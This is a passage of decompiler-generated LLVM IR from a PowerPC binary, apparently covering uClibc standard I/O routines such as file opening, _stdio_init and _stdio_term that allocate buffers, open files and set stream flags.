  %v3_10003240 = icmp eq i32 %v0_10003240, 0
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10003248 = inttoptr i32 %v0_1000323c to i32*
  store i32 22, i32* %v2_10003248, align 4
  br i1 %v3_10003240, label %dec_label_pc_1000349c, label %dec_label_pc_10003250

dec_label_pc_10003250:                            ; preds = %dec_label_pc_10003330, %dec_label_pc_1000323c
  %v0_10003250 = load i32, i32* @r31, align 4
  %v1_10003250 = inttoptr i32 %v0_10003250 to i16*
  %v2_10003250 = load i16, i16* %v1_10003250, align 2
  %v3_10003250 = zext i16 %v2_10003250 to i32
  store i32 %v3_10003250, i32* %r0.global-to-local, align 4
  %v1_10003254 = and i32 %v3_10003250, 8192
  store i32 %v1_10003254, i32* %r9.global-to-local, align 4
  %v3_10003254 = icmp eq i32 %v1_10003254, 0
  store i1 %v3_10003254, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_10003254, label %dec_label_pc_1000349c, label %dec_label_pc_1000325c

dec_label_pc_1000325c:                            ; preds = %dec_label_pc_10003250
  store i32 %v0_10003250, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10003264.347 to i32), i32* @lr, align 4
  %v0_10003260 = call i32 @free()
  br label %dec_label_pc_1000349c

dec_label_pc_10003268:                            ; preds = %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000326c

dec_label_pc_1000326c:                            ; preds = %dec_label_pc_10003230, %dec_label_pc_10003224, %dec_label_pc_10003268
  %v0_1000328c = phi i32 [ 1089, %dec_label_pc_10003230 ], [ 577, %dec_label_pc_10003224 ], [ 1, %dec_label_pc_10003268 ]
  %v2_1000326c = add i32 %tmp, 1
  %v3_1000326c = inttoptr i32 %v2_1000326c to i8*
  %v4_1000326c = load i8, i8* %v3_1000326c, align 1
  %v5_1000326c = zext i8 %v4_1000326c to i32
  store i32 %v5_1000326c, i32* %r0.global-to-local, align 4
  %v3_10003274 = icmp eq i8 %v4_1000326c, 98
  br i1 %v3_10003274, label %dec_label_pc_10003280, label %dec_label_pc_1000327c

dec_label_pc_1000327c:                            ; preds = %dec_label_pc_1000326c
  br label %dec_label_pc_10003280

dec_label_pc_10003280:                            ; preds = %dec_label_pc_1000326c, %dec_label_pc_1000327c
  %storemerge = phi i32 [ %tmp, %dec_label_pc_1000327c ], [ %v2_1000326c, %dec_label_pc_1000326c ]
  %v0_10003280 = phi i32 [ %tmp, %dec_label_pc_1000327c ], [ %v2_1000326c, %dec_label_pc_1000326c ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_10003280 = add i32 %v0_10003280, 1
  %v2_10003280 = inttoptr i32 %v1_10003280 to i8*
  %v3_10003280 = load i8, i8* %v2_10003280, align 1
  %v4_10003280 = zext i8 %v3_10003280 to i32
  store i32 %v4_10003280, i32* %r0.global-to-local, align 4
  %v3_10003284 = icmp eq i8 %v3_10003280, 43
  br i1 %v3_10003284, label %dec_label_pc_1000328c, label %dec_label_pc_10003294

dec_label_pc_1000328c:                            ; preds = %dec_label_pc_10003280
  store i32 %v0_1000328c, i32* %r9.global-to-local, align 4
  %v1_10003290 = add nuw nsw i32 %v0_1000328c, 1
  store i32 %v1_10003290, i32* @r28, align 4
  br label %dec_label_pc_10003294

dec_label_pc_10003294:                            ; preds = %dec_label_pc_10003280, %dec_label_pc_1000328c
  %v3_10003294 = icmp eq i32 %v0_10003210, 0
  br i1 %v3_10003294, label %dec_label_pc_1000329c, label %dec_label_pc_100032c4

dec_label_pc_1000329c:                            ; preds = %dec_label_pc_10003294
  store i32 80, i32* @r3, align 4
  store i32 268448420, i32* @lr, align 4
  %v0_100032a0 = call i32 @malloc()
  store i32 %v0_100032a0, i32* @r31, align 4
  %v4_100032a4 = icmp eq i32 %v0_100032a0, 0
  store i1 %v4_100032a4, i1* %cr0_eq.global-to-local, align 1
  br i1 %v4_100032a4, label %dec_label_pc_100034a0, label %dec_label_pc_100032ac

dec_label_pc_100032ac:                            ; preds = %dec_label_pc_1000329c
  %v1_100032b0 = add i32 %v0_100032a0, 56
  store i32 %v1_100032b0, i32* @r3, align 4
  %v3_100032b4 = inttoptr i32 %v0_100032a0 to i16*
  store i16 8192, i16* %v3_100032b4, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100032bc = load i32, i32* @r31, align 4
  %v2_100032bc = add i32 %v1_100032bc, 8
  %v3_100032bc = inttoptr i32 %v2_100032bc to i32*
  store i32 0, i32* %v3_100032bc, align 4
  store i32 268448452, i32* @lr, align 4
  %v0_100032c0 = call i32 @__stdio_init_mutex()
  %v0_100032c4.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100032c4

dec_label_pc_100032c4:                            ; preds = %dec_label_pc_10003294, %dec_label_pc_100032ac
  %v0_10003324 = phi i32 [ %v0_10003214, %dec_label_pc_10003294 ], [ %v0_100032c4.pre, %dec_label_pc_100032ac ]
  %v1_100032c4 = icmp slt i32 %v0_10003324, 0
  br i1 %v1_100032c4, label %dec_label_pc_10003324, label %dec_label_pc_100032cc

dec_label_pc_100032cc:                            ; preds = %dec_label_pc_100032c4
  %v1_100032d0 = add i32 %arg1, 1
  store i32 %v1_100032d0, i32* %r0.global-to-local, align 4
  store i32 65539, i32* %r9.global-to-local, align 4
  %v1_100032d8 = load i32, i32* @r31, align 4
  %v2_100032d8 = add i32 %v1_100032d8, 4
  %v3_100032d8 = inttoptr i32 %v2_100032d8 to i32*
  store i32 %v0_10003324, i32* %v3_100032d8, align 4
  %v0_100032dc = load i32, i32* @r28, align 4
  %v1_100032dc = load i32, i32* %r9.global-to-local, align 4
  %v2_100032dc = and i32 %v1_100032dc, %v0_100032dc
  %v1_100032e0 = add i32 %v2_100032dc, 1
  store i32 %v1_100032e0, i32* %r9.global-to-local, align 4
  %v1_100032e4 = load i32, i32* %r0.global-to-local, align 4
  %v2_100032e4 = and i32 %v1_100032e4, %v1_100032e0
  store i32 %v2_100032e4, i32* %r0.global-to-local, align 4
  %v4_100032e8 = icmp eq i32 %v2_100032e4, %v1_100032e0
  br i1 %v4_100032e8, label %dec_label_pc_100032f0, label %dec_label_pc_1000323c

dec_label_pc_100032f0:                            ; preds = %dec_label_pc_100032cc
  %v2_100032f0 = sub i32 -1, %arg1
  %v3_100032f0 = and i32 %v0_100032dc, %v2_100032f0
  store i32 %v3_100032f0, i32* %r0.global-to-local, align 4
  %v1_100032f4 = and i32 %v3_100032f0, 1024
  store i32 %v1_100032f4, i32* %r9.global-to-local, align 4
  %v3_100032f4 = icmp eq i32 %v1_100032f4, 0
  store i1 %v3_100032f4, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_100032f4, label %dec_label_pc_10003318, label %dec_label_pc_100032fc

dec_label_pc_100032fc:                            ; preds = %dec_label_pc_100032f0
  %v0_100032fc = load i32, i32* @r29, align 4
  store i32 268448528, i32* @lr, align 4
  %v2_1000330c = call i32 @__libc_fcntl(i32 %v0_100032fc, i32 4)
  %v3_10003310 = icmp eq i32 %v2_1000330c, 0
  br i1 %v3_10003310, label %dec_label_pc_10003318, label %dec_label_pc_1000323c

dec_label_pc_10003318:                            ; preds = %dec_label_pc_100032fc, %dec_label_pc_100032f0
  %v1_10003318 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 15, i32 15)
  store i32 %v1_10003318, i32* %r0.global-to-local, align 4
  %v0_1000331c = load i32, i32* @r28, align 4
  %v2_1000331c = or i32 %v0_1000331c, %v1_10003318
  store i32 %v2_1000331c, i32* @r28, align 4
  br label %dec_label_pc_10003350

dec_label_pc_10003324:                            ; preds = %dec_label_pc_100032c4
  %v3_10003324 = icmp eq i32 %v0_10003324, -1
  %v0_10003334.pre = load i32, i32* @r28, align 4
  br i1 %v3_10003324, label %dec_label_pc_10003330, label %dec_label_pc_1000332c

dec_label_pc_1000332c:                            ; preds = %dec_label_pc_10003324
  %v1_1000332c = or i32 %v0_10003334.pre, 65536
  store i32 %v1_1000332c, i32* @r28, align 4
  br label %dec_label_pc_10003330

dec_label_pc_10003330:                            ; preds = %dec_label_pc_10003324, %dec_label_pc_1000332c
  %v0_10003334 = phi i32 [ %v1_1000332c, %dec_label_pc_1000332c ], [ %v0_10003334.pre, %dec_label_pc_10003324 ]
  store i32 438, i32* @r5, align 4
  store i32 268448580, i32* @lr, align 4
  %v2_10003340 = call i32 @__libc_open(i32 %arg1, i32 %v0_10003334)
  %v1_10003344 = icmp slt i32 %v2_10003340, 0
  %v1_10003348 = load i32, i32* @r31, align 4
  %v2_10003348 = add i32 %v1_10003348, 4
  %v3_10003348 = inttoptr i32 %v2_10003348 to i32*
  store i32 %v2_10003340, i32* %v3_10003348, align 4
  br i1 %v1_10003344, label %dec_label_pc_10003250, label %dec_label_pc_10003330.dec_label_pc_10003350_crit_edge

dec_label_pc_10003330.dec_label_pc_10003350_crit_edge: ; preds = %dec_label_pc_10003330
  %v0_10003354.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10003350

dec_label_pc_10003350:                            ; preds = %dec_label_pc_10003330.dec_label_pc_10003350_crit_edge, %dec_label_pc_10003318
  %v0_10003354 = phi i32 [ %v0_10003354.pre, %dec_label_pc_10003330.dec_label_pc_10003350_crit_edge ], [ %v2_1000331c, %dec_label_pc_10003318 ]
  %v0_10003350 = load i32, i32* @r31, align 4
  %v1_10003350 = inttoptr i32 %v0_10003350 to i16*
  %v2_10003350 = load i16, i16* %v1_10003350, align 2
  %v3_10003350 = zext i16 %v2_10003350 to i32
  store i32 %v3_10003350, i32* %r0.global-to-local, align 4
  %v1_10003354 = urem i32 %v0_10003354, 4
  store i32 %v1_10003354, i32* %r29.global-to-local, align 4
  %v1_10003358 = call i32 @__asm_rlwinm(i32 %v0_10003354, i32 0, i32 21, i32 21)
  %v1_1000335c = add nuw nsw i32 %v1_10003354, 1
  store i32 %v1_1000335c, i32* %r29.global-to-local, align 4
  %v1_10003360 = call i32 @__asm_rlwinm(i32 %v3_10003350, i32 0, i32 18, i32 18)
  store i32 %v1_10003360, i32* %r0.global-to-local, align 4
  %v1_10003364 = xor i32 %v1_1000335c, 3
  store i32 %v1_10003364, i32* %r29.global-to-local, align 4
  %v1_10003368 = urem i32 %v1_10003360, 65536
  store i32 %v1_10003368, i32* %r9.global-to-local, align 4
  %v0_1000336c = load i32, i32* @r28, align 4
  %v1_1000336c = call i32 @__asm_rlwinm(i32 %v0_1000336c, i32 31, i32 16, i32 16)
  %v2_10003370 = or i32 %v1_1000336c, %v1_10003358
  store i32 %v2_10003370, i32* %r0.global-to-local, align 4
  %v0_10003374 = load i32, i32* %r29.global-to-local, align 4
  %v1_10003374 = mul i32 %v0_10003374, 16
  %v0_10003378 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003378 = or i32 %v0_10003378, %v2_10003370
  store i32 %v2_10003378, i32* %r9.global-to-local, align 4
  %v2_1000337c = or i32 %v2_10003378, %v1_10003374
  store i32 %v2_1000337c, i32* @r29, align 4
  %v1_10003380 = trunc i32 %v2_1000337c to i16
  %v2_10003380 = load i32, i32* @r31, align 4
  %v3_10003380 = inttoptr i32 %v2_10003380 to i16*
  store i16 %v1_10003380, i16* %v3_10003380, align 2
  %v0_10003384 = call i32 @__errno_location()
  store i32 %v0_10003384, i32* @r28, align 4
  %v0_1000338c = load i32, i32* @r31, align 4
  %v1_1000338c = add i32 %v0_1000338c, 4
  %v2_1000338c = inttoptr i32 %v1_1000338c to i32*
  %v3_1000338c = load i32, i32* %v2_1000338c, align 4
  %v1_10003390 = inttoptr i32 %v0_10003384 to i32*
  %v2_10003390 = load i32, i32* %v1_10003390, align 4
  store i32 %v2_10003390, i32* @r27, align 4
  store i32 268448664, i32* @lr, align 4
  %v1_10003394 = call i32 @isatty(i32 %v3_1000338c)
  %v1_10003398 = mul i32 %v1_10003394, 256
  %v0_1000339c = load i32, i32* @r29, align 4
  %v2_1000339c = or i32 %v0_1000339c, %v1_10003398
  store i32 %v2_1000339c, i32* @r29, align 4
  %v1_100033a0 = trunc i32 %v2_1000339c to i16
  %v2_100033a0 = load i32, i32* @r31, align 4
  %v3_100033a0 = inttoptr i32 %v2_100033a0 to i16*
  store i16 %v1_100033a0, i16* %v3_100033a0, align 2
  %v0_100033a4 = load i32, i32* @r27, align 4
  %v1_100033a4 = load i32, i32* @r28, align 4
  %v2_100033a4 = inttoptr i32 %v1_100033a4 to i32*
  store i32 %v0_100033a4, i32* %v2_100033a4, align 4
  %v0_100033a8 = load i32, i32* @r31, align 4
  %v1_100033a8 = add i32 %v0_100033a8, 8
  %v2_100033a8 = inttoptr i32 %v1_100033a8 to i32*
  %v3_100033a8 = load i32, i32* %v2_100033a8, align 4
  store i32 %v3_100033a8, i32* %r0.global-to-local, align 4
  %v3_100033ac = icmp eq i32 %v3_100033a8, 0
  br i1 %v3_100033ac, label %dec_label_pc_100033b4, label %dec_label_pc_100033e4

dec_label_pc_100033b4:                            ; preds = %dec_label_pc_10003350
  store i32 4096, i32* @r3, align 4
  store i32 268448700, i32* @lr, align 4
  %v0_100033b8 = call i32 @malloc()
  %v3_100033bc = icmp eq i32 %v0_100033b8, 0
  %v1_100033c0 = load i32, i32* @r31, align 4
  %v2_100033c0 = add i32 %v1_100033c0, 8
  %v3_100033c0 = inttoptr i32 %v2_100033c0 to i32*
  store i32 %v0_100033b8, i32* %v3_100033c0, align 4
  %v1_100033e0 = load i32, i32* @r31, align 4
  br i1 %v3_100033bc, label %dec_label_pc_100033e0, label %dec_label_pc_100033c8

dec_label_pc_100033c8:                            ; preds = %dec_label_pc_100033b4
  %v1_100033c8 = inttoptr i32 %v1_100033e0 to i16*
  %v2_100033c8 = load i16, i16* %v1_100033c8, align 2
  %v3_100033c8 = zext i16 %v2_100033c8 to i32
  store i32 %v3_100033c8, i32* %r0.global-to-local, align 4
  %v1_100033cc = add i32 %v0_100033b8, 4096
  store i32 %v1_100033cc, i32* %r9.global-to-local, align 4
  %v2_100033d0 = add i32 %v1_100033e0, 12
  %v3_100033d0 = inttoptr i32 %v2_100033d0 to i32*
  store i32 %v1_100033cc, i32* %v3_100033d0, align 4
  %v0_100033d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100033d4 = or i32 %v0_100033d4, 16384
  store i32 %v1_100033d4, i32* %r0.global-to-local, align 4
  %v1_100033d8 = trunc i32 %v1_100033d4 to i16
  %v2_100033d8 = load i32, i32* @r31, align 4
  %v3_100033d8 = inttoptr i32 %v2_100033d8 to i16*
  store i16 %v1_100033d8, i16* %v3_100033d8, align 2
  br label %dec_label_pc_100033e4

dec_label_pc_100033e0:                            ; preds = %dec_label_pc_100033b4
  %v2_100033e0 = add i32 %v1_100033e0, 12
  %v3_100033e0 = inttoptr i32 %v2_100033e0 to i32*
  store i32 0, i32* %v3_100033e0, align 4
  br label %dec_label_pc_100033e4

dec_label_pc_100033e4:                            ; preds = %dec_label_pc_10003350, %dec_label_pc_100033c8, %dec_label_pc_100033e0
  %v0_100033e4 = load i32, i32* @r31, align 4
  %v1_100033e4 = inttoptr i32 %v0_100033e4 to i16*
  %v2_100033e4 = load i16, i16* %v1_100033e4, align 2
  %v3_100033e4 = zext i16 %v2_100033e4 to i32
  store i32 %v3_100033e4, i32* %r0.global-to-local, align 4
  %v1_100033e8 = add i32 %v0_100033e4, 8
  %v2_100033e8 = inttoptr i32 %v1_100033e8 to i32*
  %v3_100033e8 = load i32, i32* %v2_100033e8, align 4
  store i32 %v3_100033e8, i32* %r9.global-to-local, align 4
  %v1_100033ec = and i32 %v3_100033e4, 8192
  %v3_100033ec = icmp eq i32 %v1_100033ec, 0
  store i1 %v3_100033ec, i1* %cr0_eq.global-to-local, align 1
  %v3_100033f4 = add i32 %v0_100033e4, 2
  %v4_100033f4 = inttoptr i32 %v3_100033f4 to i8*
  store i8 0, i8* %v4_100033f4, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_100033fc = load i32, i32* %r9.global-to-local, align 4
  %v1_100033fc = load i32, i32* @r31, align 4
  %v2_100033fc = add i32 %v1_100033fc, 20
  %v3_100033fc = inttoptr i32 %v2_100033fc to i32*
  store i32 %v0_100033fc, i32* %v3_100033fc, align 4
  %v0_10003400 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003400 = load i32, i32* @r31, align 4
  %v2_10003400 = add i32 %v1_10003400, 24
  %v3_10003400 = inttoptr i32 %v2_10003400 to i32*
  store i32 %v0_10003400, i32* %v3_10003400, align 4
  %v0_10003404 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003404 = load i32, i32* @r31, align 4
  %v2_10003404 = add i32 %v1_10003404, 28
  %v3_10003404 = inttoptr i32 %v2_10003404 to i32*
  store i32 %v0_10003404, i32* %v3_10003404, align 4
  %v0_10003408 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003408 = load i32, i32* @r31, align 4
  %v2_10003408 = add i32 %v1_10003408, 16
  %v3_10003408 = inttoptr i32 %v2_10003408 to i32*
  store i32 %v0_10003408, i32* %v3_10003408, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v0_10003410 = load i32, i32* %r0.global-to-local, align 4
  %v1_10003410 = load i32, i32* @r31, align 4
  %v2_10003410 = add i32 %v1_10003410, 44
  %v3_10003410 = inttoptr i32 %v2_10003410 to i32*
  store i32 %v0_10003410, i32* %v3_10003410, align 4
  %v3_10003414 = load i32, i32* @global_var_1001d7f8.348, align 4
  store i32 %v3_10003414, i32* %r0.global-to-local, align 4
  %v1_10003418 = load i32, i32* @r31, align 4
  %v2_10003418 = add i32 %v1_10003418, 52
  %v3_10003418 = inttoptr i32 %v2_10003418 to i32*
  store i32 %v3_10003414, i32* %v3_10003418, align 4
  %v0_1000341c = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000341c, label %dec_label_pc_100034a0, label %dec_label_pc_10003420

dec_label_pc_10003420:                            ; preds = %dec_label_pc_100033e4
  store i32 ptrtoint ([3 x i8]* @global_var_10006d28.342 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1001d4b4.343 to i32), i32* %r29.global-to-local, align 4
  %v2_10003430 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10003430, i32* @r26, align 4
  store i32 %v2_10003430, i32* @r3, align 4
  %v0_10003440 = call i32 @__pthread_return_void()
  %v2_1000344c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000344c, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_1001d49c.349 to i32), i32* @r29, align 4
  %v0_10003454 = call i32 @__pthread_return_0()
  store i32 %v2_1000344c, i32* @r3, align 4
  %v0_10003464 = call i32 @__pthread_return_void()
  %v0_1000346c = call i32 @__pthread_return_0()
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10003474 = load i32, i32* bitcast (i32** @global_var_1001d7f4.350 to i32*), align 4
  store i32 %v3_10003474, i32* %r0.global-to-local, align 4
  store i32 %v2_1000344c, i32* @r3, align 4
  %v1_10003480 = load i32, i32* @r31, align 4
  %v2_10003480 = add i32 %v1_10003480, 32
  %v3_10003480 = inttoptr i32 %v2_10003480 to i32*
  store i32 %v3_10003474, i32* %v3_10003480, align 4
  %v0_10003484 = load i32, i32* @r31, align 4
  store i32 %v0_10003484, i32* bitcast (i32** @global_var_1001d7f4.350 to i32*), align 4
  %v0_10003488 = call i32 @__pthread_return_void()
  store i32 %v2_10003430, i32* @r3, align 4
  %v0_10003494 = call i32 @__pthread_return_void()
  br label %dec_label_pc_100034a0

dec_label_pc_1000349c:                            ; preds = %dec_label_pc_10003250, %dec_label_pc_1000323c, %dec_label_pc_1000325c
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_100034a0

dec_label_pc_100034a0:                            ; preds = %dec_label_pc_100033e4, %dec_label_pc_1000329c, %dec_label_pc_10003420, %dec_label_pc_1000349c
  store i32 %v0_100031fc, i32* %r0.global-to-local, align 4
  %v0_100034a4 = load i32, i32* @r31, align 4
  ret i32 %v0_100034a4

; uselistorder directives
  uselistorder i32 %v1_100033e0, { 2, 0, 1 }
  uselistorder i32 %v0_10003354, { 1, 0 }
  uselistorder i32 %v0_100032a0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000328c, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_100034a0, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000349c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100033e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10003330, { 1, 0 }
  uselistorder label %dec_label_pc_100032c4, { 1, 0 }
  uselistorder label %dec_label_pc_10003294, { 1, 0 }
  uselistorder label %dec_label_pc_10003280, { 1, 0 }
  uselistorder label %dec_label_pc_1000326c, { 2, 0, 1 }
}

define i32 @_stdio_init(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268566528, i32* @r28, align 4
  %v0_100034cc = call i32 @__errno_location()
  store i32 %v0_100034cc, i32* @r26, align 4
  %v1_100034d8 = inttoptr i32 %v0_100034cc to i32*
  %v2_100034d8 = load i32, i32* %v1_100034d8, align 4
  store i32 %v2_100034d8, i32* @r25, align 4
  store i32 ptrtoint (i16* @global_var_1001d4cc.284 to i32), i32* @r27, align 4
  %v3_100034e0 = load i16, i16* @global_var_1001d4cc.284, align 2
  %v4_100034e0 = zext i16 %v3_100034e0 to i32
  store i32 %v4_100034e0, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100034e8.352 to i32), i32* @lr, align 4
  %v1_100034e4 = call i32 @isatty(i32 0)
  %v1_100034e8 = sub i32 1, %v1_100034e4
  %v1_100034ec = mul i32 %v1_100034e8, 256
  %v0_100034f0 = load i32, i32* @r29, align 4
  %v2_100034f0 = xor i32 %v1_100034ec, %v0_100034f0
  %v1_100034f8 = trunc i32 %v2_100034f0 to i16
  store i16 %v1_100034f8, i16* @global_var_1001d4cc.284, align 2
  %v3_100034fc = load i16, i16* @global_var_1001d51c.285, align 2
  %v4_100034fc = zext i16 %v3_100034fc to i32
  store i32 %v4_100034fc, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10003504.353 to i32), i32* @lr, align 4
  %v1_10003500 = call i32 @isatty(i32 1)
  %v1_10003504 = sub i32 1, %v1_10003500
  %v1_10003508 = mul i32 %v1_10003504, 256
  %v0_1000350c = load i32, i32* @r29, align 4
  %v2_1000350c = xor i32 %v1_10003508, %v0_1000350c
  %v1_10003510 = trunc i32 %v2_1000350c to i16
  store i16 %v1_10003510, i16* @global_var_1001d51c.285, align 2
  %v0_10003514 = load i32, i32* @r25, align 4
  %v1_10003514 = load i32, i32* @r26, align 4
  %v2_10003514 = inttoptr i32 %v1_10003514 to i32*
  store i32 %v0_10003514, i32* %v2_10003514, align 4
  ret i32 %v1_10003508

; uselistorder directives
  uselistorder i32 %v1_10003508, { 1, 0 }
  uselistorder i16* @global_var_1001d51c.285, { 2, 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 24, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000bca8.354 to i32), i32* @r4, align 4
  %v0_10003538 = call i32 @memcpy()
  ret i32 %v0_10003538
}

define i32 @_stdio_term(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1001d49c.349 to i32), i32* @r3, align 4
  store i32 268449112, i32* @lr, align 4
  %v0_10003554 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_1001d4b4.343 to i32), i32* @r3, align 4
  store i32 268449124, i32* @lr, align 4
  %v0_10003560 = call i32 @__stdio_init_mutex()
  store i32 268566528, i32* %r9.global-to-local, align 4
  %storemerge6 = load i32, i32* bitcast (i32** @global_var_1001d7f4.350 to i32*), align 4
  store i32 %storemerge6, i32* %r31.global-to-local, align 4
  %v3_100035ac9 = icmp eq i32 %storemerge6, 0
  %v1_100035b011 = add i32 %storemerge6, 56
  store i32 %v1_100035b011, i32* %r30.global-to-local, align 4
  br i1 %v3_100035ac9, label %dec_label_pc_100035bc, label %dec_label_pc_10003570

dec_label_pc_10003570:                            ; preds = %entry, %dec_label_pc_1000359c
  %v0_10003570 = call i32 @__pthread_return_0()
  %v3_10003574 = icmp eq i32 %v0_10003570, 0
  %v0_10003578 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10003578, i32* @r3, align 4
  br i1 %v3_10003574, label %dec_label_pc_1000359c, label %dec_label_pc_10003580

dec_label_pc_10003580:                            ; preds = %dec_label_pc_10003570
  %v0_10003580 = load i32, i32* %r31.global-to-local, align 4
  %v1_10003580 = add i32 %v0_10003580, 8
  %v2_10003580 = inttoptr i32 %v1_10003580 to i32*
  %v3_10003580 = load i32, i32* %v2_10003580, align 4
  store i32 %v3_10003580, i32* %r9.global-to-local, align 4
  %v3_10003588 = inttoptr i32 %v0_10003580 to i16*
  store i16 48, i16* %v3_10003588, align 2
  %v0_1000358c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000358c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000358c = add i32 %v1_1000358c, 20
  %v3_1000358c = inttoptr i32 %v2_1000358c to i32*
  store i32 %v0_1000358c, i32* %v3_1000358c, align 4
  %v0_10003590 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003590 = load i32, i32* %r31.global-to-local, align 4
  %v2_10003590 = add i32 %v1_10003590, 24
  %v3_10003590 = inttoptr i32 %v2_10003590 to i32*
  store i32 %v0_10003590, i32* %v3_10003590, align 4
  %v0_10003594 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003594 = load i32, i32* %r31.global-to-local, align 4
  %v2_10003594 = add i32 %v1_10003594, 28
  %v3_10003594 = inttoptr i32 %v2_10003594 to i32*
  store i32 %v0_10003594, i32* %v3_10003594, align 4
  %v0_10003598 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003598 = load i32, i32* %r31.global-to-local, align 4
  %v2_10003598 = add i32 %v1_10003598, 16
  %v3_10003598 = inttoptr i32 %v2_10003598 to i32*
  store i32 %v0_10003598, i32* %v3_10003598, align 4
  br label %dec_label_pc_1000359c

dec_label_pc_1000359c:                            ; preds = %dec_label_pc_10003570, %dec_label_pc_10003580
  %v1_100035a0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100035a0 = add i32 %v1_100035a0, 52
  %v3_100035a0 = inttoptr i32 %v2_100035a0 to i32*
  store i32 1, i32* %v3_100035a0, align 4
  store i32 268449192, i32* @lr, align 4
  %v0_100035a4 = call i32 @__stdio_init_mutex()
  %v0_100035a8 = load i32, i32* %r31.global-to-local, align 4
  %v1_100035a8 = add i32 %v0_100035a8, 32
  %v2_100035a8 = inttoptr i32 %v1_100035a8 to i32*
  %storemerge = load i32, i32* %v2_100035a8, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_100035ac = icmp eq i32 %storemerge, 0
  %v1_100035b0 = add i32 %storemerge, 56
  store i32 %v1_100035b0, i32* %r30.global-to-local, align 4
  br i1 %v3_100035ac, label %dec_label_pc_100035ac.dec_label_pc_100035bc_crit_edge, label %dec_label_pc_10003570

dec_label_pc_100035ac.dec_label_pc_100035bc_crit_edge: ; preds = %dec_label_pc_1000359c
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_1001d7f4.350 to i32*), align 4
  br label %dec_label_pc_100035bc

dec_label_pc_100035bc:                            ; preds = %dec_label_pc_100035ac.dec_label_pc_100035bc_crit_edge, %entry
  %v0_100035f816 = phi i32 [ %v1_100035b0, %dec_label_pc_100035ac.dec_label_pc_100035bc_crit_edge ], [ %v1_100035b011, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_100035ac.dec_label_pc_100035bc_crit_edge ], [ 0, %entry ]
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %storemerge12, i32* @r31, align 4
  %v3_100035e05 = icmp eq i32 %storemerge12, 0
  br i1 %v3_100035e05, label %dec_label_pc_100035e8, label %dec_label_pc_100035c8

dec_label_pc_100035c8:                            ; preds = %dec_label_pc_100035bc, %dec_label_pc_100035dc
  %v0_100035c8 = phi i32 [ %storemerge1, %dec_label_pc_100035dc ], [ %storemerge12, %dec_label_pc_100035bc ]
  %v1_100035c8 = inttoptr i32 %v0_100035c8 to i16*
  %v2_100035c8 = load i16, i16* %v1_100035c8, align 2
  %v3_100035c8 = zext i16 %v2_100035c8 to i32
  store i32 %v0_100035c8, i32* @r3, align 4
  %v1_100035d0 = and i32 %v3_100035c8, 64
  store i32 %v1_100035d0, i32* %r9.global-to-local, align 4
  %v3_100035d0 = icmp eq i32 %v1_100035d0, 0
  br i1 %v3_100035d0, label %dec_label_pc_100035dc, label %dec_label_pc_100035d8

dec_label_pc_100035d8:                            ; preds = %dec_label_pc_100035c8
  store i32 268449244, i32* @lr, align 4
  %v0_100035d8 = call i32 @__stdio_wcommit()
  %v0_100035dc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100035dc

dec_label_pc_100035dc:                            ; preds = %dec_label_pc_100035c8, %dec_label_pc_100035d8
  %v0_100035dc = phi i32 [ %v0_100035c8, %dec_label_pc_100035c8 ], [ %v0_100035dc.pre, %dec_label_pc_100035d8 ]
  %v0_100035f817 = phi i32 [ %v0_100035c8, %dec_label_pc_100035c8 ], [ %v0_100035d8, %dec_label_pc_100035d8 ]
  %v1_100035dc = add i32 %v0_100035dc, 32
  %v2_100035dc = inttoptr i32 %v1_100035dc to i32*
